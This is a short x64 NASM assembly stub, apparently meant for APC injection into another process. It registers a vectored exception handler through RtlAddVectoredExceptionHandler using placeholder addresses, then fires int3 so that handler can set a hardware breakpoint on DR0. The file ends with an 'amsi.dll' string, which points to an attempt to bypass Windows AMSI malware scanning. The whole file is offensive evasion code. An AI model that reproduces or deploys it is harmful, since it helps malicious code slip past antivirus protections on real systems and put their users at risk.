[BITS 64]

; nasm -f bin apc.asm -o apc.bin ; xxd -i apc.bin
ApcStub:
    push rbp
    mov rbp, rsp
    sub rsp, 28h                ; 32 bytes shadow space + 8 bytes alignment

    ; 2. RtlAddVectoredExceptionHandler(1, pVehHandler)
    mov rcx, 1                  ; CALL_FIRST
    mov rdx, 0xDDDDDDDDDDDDDDDD ; Placeholder for pRemoteVeh
    mov rax, 0xEEEEEEEEEEEEEEEE ; Placeholder for pRtlAddVeh
    call rax

    ; 3. Trigger VEH to apply HWBP on DR0
    int3

    add rsp, 28h
    pop rbp
    ret

align 8
AmsiStr:
    db 'amsi.dll', 0